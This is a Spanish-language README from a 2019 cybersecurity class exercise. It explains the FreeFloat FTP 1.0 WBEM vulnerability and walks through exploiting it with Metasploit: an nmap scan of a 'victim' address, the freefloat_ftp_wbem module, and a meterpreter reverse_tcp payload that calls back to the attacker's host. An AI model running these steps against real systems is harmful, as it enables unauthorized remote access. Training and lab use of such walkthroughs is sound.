# CiberPractica
Practica Ciberseguridad 2019

---------------------------------------------------------
# Información del exploit FreeFloat FTP Wbem Freefloat v1.0

este exploit lo ha subido sinn3r y juan vazquez (ambos de @metasploit):

esta vulnerabilidad fue encontrada en el servicio de freefloat 1.0, la cual permite a un usuario malicioso
ingresar al sistema que esté corriendo este servicio.
la forma en que el exploit se ejecuta es la siguiento:

  1. No se necesita credencial para iniciar sesión
  2. la ruta predeterminada del usuario está en C: \, y esto no se puede cambiar.
  3. el usuario puede escribir en cualquier parte del sistema de archivos del servidor. Como resultado de estas implementaciones deficientes,     un usuario malintencionado puede simplemente iniciar sesión y luego cargar archivos, y dejar que WMI ejecute la carga útil cargada

El exploit está cargado en la base de datos de metasploit framework, puede ser usado desde allí.
Finalmente, el exploit fue divulgado el 07/12/2012

# Instrucciones

1.Escanear el equipo victima para determinar en que puerto y que servicio está corriendo.<br>

  nmap -sC -sV -V 123.34.54.2 (ejemplo)<br>
  
2.Despues de identificar el puerto y servicio abrir metasploit (msfdb run ó msfconsole)<br>

3.Buscar el exploit:

  msf5 > search freefloat (ejemplo)<br>
  
4.Seleccionar el exploit:

  use exploit/windows/ftp/freefloat_ftp_wbem<br>
  
5.Ver la configuración del exploit, para ello usamos show options, show info y de ser necesario cambiar algun parametro
avanzado puede revisar la configuración avanzada con show advanced.

6.Cambiar los valores de RHOSTS y RPORT por el de la maquina victima y el puerto en donde corre el servicio, en este caso el 21
por defecto, los servicios de ftp usan este puerto, ademas para asegurarnos nos dimos cuenta que con nmap vimos que ese puerto corria
el servicio de ftp con freefloat 1.0v:

  set RHOST 123.34.54.2<br>
  set RPORT 21<br>
  
7.Seleccionamos el payload, en este caso se trata de un OS windows:

  set payload windows/meterpreter/reverse_tcp<br>
  
8.Cambiamos las opciones del payload, el LHOST y el LPORT, LHOST es nuestra maquina, a la cual se conectará la maquina victima,y LPORT es el puerto al que se conectará en nuestra maquina:

  set LPORT 4444<br>
  set LHOST 123.45.67.8<br>
  
9.AHORA SI, CORREMOS EL EXPLOIT :D   :

  msf5> run ó msf5> exploit (el clasico)<br>
 
 # FELIZ HACKING B)
 ![UPS NO CARGÓ LA IMAGEN :v ](https://opinionstage-res.cloudinary.com/image/upload/c_lfill,dpr_1.0,f_auto,fl_lossy,q_auto:good,w_700/v1/polls/sxso0xaofrrfzgaq3kqb)
 
# WebGrafía:

  https://www.rapid7.com/db/modules/exploit/windows/ftp/freefloatftp_wbem
  
Herramientas usadas para la demo:

  nmap y NSE: https://nmap.org/<br>
  metasploitframework: https://www.metasploit.com/

